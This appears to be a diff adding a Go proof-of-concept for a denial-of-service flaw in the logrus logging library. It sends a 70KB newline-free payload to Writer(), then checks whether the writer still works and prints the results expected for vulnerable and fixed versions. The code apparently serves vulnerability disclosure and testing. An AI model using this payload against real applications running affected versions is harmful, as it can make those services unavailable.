@@ -1,0 +1,74 @@
+package main
+
+import (
+	"bytes"
+	"fmt"
+	"time"
+
+	"github.com/sirupsen/logrus"
+)
+
+// Improved PoC that demonstrates the DoS more clearly
+// This version shows both the scanner error AND the hang condition
+
+func main() {
+	// Get version info from go.mod if available
+	fmt.Println("=== logrus DoS PoC - Writer() >64KB single-line ===")
+	fmt.Println()
+
+	// Create logger
+	logger := logrus.New()
+	logger.SetLevel(logrus.InfoLevel)
+
+	// Get Writer() - this is the vulnerable function
+	w := logger.Writer()
+	defer w.Close()
+
+	// Create 70KB payload without newlines
+	payload := bytes.Repeat([]byte("A"), 70000)
+	fmt.Printf("Payload size: %d bytes (70KB, no newlines)\n", len(payload))
+	fmt.Println()
+
+	// Write the payload - this triggers the vulnerability
+	fmt.Println("Writing payload to logrus.Writer()...")
+	fmt.Println("This should trigger: 'bufio.Scanner: token too long' error")
+	fmt.Println()
+
+	_, err := w.Write(payload)
+	if err != nil {
+		fmt.Printf("Write error: %v\n", err)
+	}
+
+	// Wait to see if process hangs or continues
+	fmt.Println("Waiting 10 seconds to observe behavior...")
+	fmt.Println("In vulnerable versions, the process may hang or become unresponsive.")
+	fmt.Println("In fixed versions, the process should continue normally.")
+	fmt.Println()
+
+	// Try to write more to see if Writer is still functional
+	time.Sleep(2 * time.Second)
+	fmt.Println("Attempting to write more data to Writer()...")
+	_, err2 := w.Write([]byte("test\n"))
+	if err2 != nil {
+		fmt.Printf("Second write error (Writer is broken): %v\n", err2)
+		fmt.Println("✓ DoS confirmed: Writer() is no longer functional")
+	} else {
+		fmt.Println("✓ Second write succeeded - Writer() is still functional (FIXED version)")
+	}
+
+	// Wait longer to show hang
+	fmt.Println()
+	fmt.Println("Waiting additional 8 seconds...")
+	time.Sleep(8 * time.Second)
+
+	fmt.Println()
+	fmt.Println("=== PoC Complete ===")
+	fmt.Println()
+	fmt.Println("Expected results:")
+	fmt.Println("- Vulnerable (v1.8.1): Error 'bufio.Scanner: token too long', Writer becomes unusable")
+	fmt.Println("- Fixed (v1.8.3+): No error, Writer continues to function normally")
+	fmt.Println()
+	fmt.Println("The error message itself demonstrates the DoS vulnerability.")
+	fmt.Println("The Writer() becomes unusable, causing application unavailability.")
+}
+
